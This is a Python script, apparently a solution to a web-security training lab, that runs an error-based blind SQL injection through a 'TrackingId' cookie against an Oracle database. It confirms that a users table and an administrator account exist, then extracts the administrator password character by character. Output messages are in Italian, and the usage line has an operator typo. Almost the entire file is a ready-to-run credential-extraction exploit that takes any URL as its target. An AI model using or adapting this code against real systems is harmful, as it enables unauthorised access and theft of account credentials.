import requests
import sys
import urllib3
from string import ascii_lowercase

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def perform_request(url,sql_payload):
    cookies = {'TrackingId' : 'CFHI1w1gZTmFqH0d' + sql_payload , 'session' : 'caFUxTVpehuX50CtnhwEG8lpnk9i2daM'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    response_status = r.status_code
    return response_status


def exploit_sqli_table_existence(url):
    sql_payload = "' || (SELECT '' FROM users WHERE ROWNUM = 1) || '"
    response_status = perform_request(url,sql_payload)
    if response_status == 200:
        print("[+] La tabella users esiste")
        return True
    print("[-] La tabella users non esiste")
    return False


def exploit_sqli_administrator_existence(url):
    sql_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"
    response_status = perform_request(url, sql_payload)
    if response_status == 500:
        print("[+] L'utente administrator esiste")
        return True
    print("[-] L'utente administrator non esiste")
    return False


def exploit_sqli_password_length(url):
    for i in range(1,50):
        sql_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>%i) || '" %i
        response_status = perform_request(url,sql_payload)
        sys.stdout.write("[+] La lunghezza della password è di %s caratteri\r" % str(i))
        sys.stdout.flush()
        if response_status == 200:
            print("[+] La lunghezza della password è di %s caratteri\r" % str(i))
            return i
    print("\n[-] Impossibile determinare la lunghezza della password")
    return False

def exploit_sqli_password_enumerator(url,password_length):
    administrator_password = ""
    alc = ascii_lowercase
    for i in range(0,10):
        alc = alc + str(i)
    for i in range(1,password_length+1):
        for x in alc:
            sql_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,{0},1)='{1}') || '".format(i,x)
            response_status = perform_request(url,sql_payload)
            if response_status == 500:
                administrator_password += x
                sys.stdout.write('[+] La password di administrator è: ' + administrator_password + '\r')
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('[+] La password di administrator è: ' + administrator_password + x + '\r')
                sys.stdout.flush()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[+] Utilizzo: %s <url>" % sys.argv[0])
        print("[+] Esempio: %s www.example.com" & sys.argv[0])
        sys.exit()

    exploit_sqli_table_existence(url)
    exploit_sqli_administrator_existence(url)
    password_length = exploit_sqli_password_length(url)
    exploit_sqli_password_enumerator(url,password_length)
    print("\n\r")